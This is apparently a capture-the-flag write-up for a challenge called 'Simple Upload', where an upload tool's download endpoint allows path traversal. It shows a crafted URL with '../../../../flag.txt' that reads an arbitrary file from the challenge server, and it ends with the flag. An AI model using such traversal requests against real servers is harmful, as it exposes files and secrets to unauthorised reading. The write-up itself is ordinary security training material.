# Simple Upload

> The challenge was authored by [criticic](https://iitbhucybersec.in/authors/criticic/)

Total Solves - 124

Final Points - 100

## Description
Made another upload tool. This time it can accept more things!

## Writeup
This challenge was essentially a path traversal challenge.

When you upload something, a link to the uploaded file is given.

```
http://codefest-ctf.iitbhu.tech:10192/download?file=uploads/upload.png
```

If you try to put a path in file parameter, it fetches the file from the path allowing us to get any file on the system.

```
http://codefest-ctf.iitbhu.tech:10192/download?file=../../../../flag.txt
```
This gives the flag!

## Flag
`CodefestCTF{p4th_7r4v3r5al_15_5c4ry_[a-zA-Z0-9]}`